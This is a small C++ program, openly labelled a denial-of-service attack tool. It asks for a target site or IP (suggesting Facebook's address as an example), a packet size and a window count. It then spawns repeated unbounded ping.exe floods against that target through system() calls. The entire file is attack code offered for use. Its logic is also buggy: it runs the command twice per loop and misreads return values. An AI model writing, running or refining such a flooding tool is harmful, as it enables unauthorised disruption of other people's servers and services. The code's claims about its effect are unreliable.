//CODE _____ DERRADJ.I
//simple code for DOS attack

#include <iostream>
#include <cstdlib>
#include <unistd.h>

using namespace std;


void DOS(){
	string cmd , target , bytes;
	int time, windows;
	
	//change color of CMD :/
	system("color 0F");
	cout << "\t\t\tCreated By : Derradjib76f :-) \n\n\n";
	
	/*the website or IP example : 
	www.facebook.com ---> 157.240.196.35 (dz)*/
	
	cout << "Put the target without (https:// - http://) : ";
	cin >> target;
	cout << "\n\t\t------------------------\n\t\t------------------------\n";
	cout << "\n\t\tNumber of Bytes (ecample : 5120) : ";
	cin >> bytes;
	cout << "\n\t\tTIME by seconds (example : 2) : ";
	cin >> time;
	cout << "\n\t\tNumber OF Windows (ecample : 10) : ";
	cin >> windows;
	
	//send bytes to target (the processor will be tired) :)
	cmd = "start ping.exe -t " + target + " -l " + bytes; 
	
	for (int st_rt = 0 ; st_rt <= windows ; st_rt++){
		//for loop to open anouther windows
		const char *command = cmd.c_str(); 
		system(command);
		sleep(time);
		
		//if user input a wrong site !
		if (system(command) != 1){
			system("cls");
			cout << "\n----------\n  ERROR\n----------\n" << "\n**************************\n Please Check Your Target *\n**************************\n\n";
			return DOS();
		}
		else continue;
    }   
}

int main() {
	DOS(); //  function DOS :)
	return 0;
}
